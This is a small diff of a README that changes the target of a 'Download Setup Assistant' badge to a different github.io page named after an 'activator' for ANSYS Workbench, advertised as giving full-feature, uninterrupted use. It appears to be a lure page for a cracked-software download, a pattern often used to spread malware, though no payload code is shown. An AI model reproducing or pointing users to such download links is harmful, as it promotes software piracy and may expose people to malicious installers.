@@ -7,7 +7,7 @@ Built for engineers, researchers, and analysts requiring uninterrupted, full-fea
 ---
 
 🔘 **Download Setup Assistant**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-orange)](https://activator-ansys-workbench.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-orange)](https://gustavoknightgjay.github.io/.github/activator-ansys-workbench)
 
 ---
 
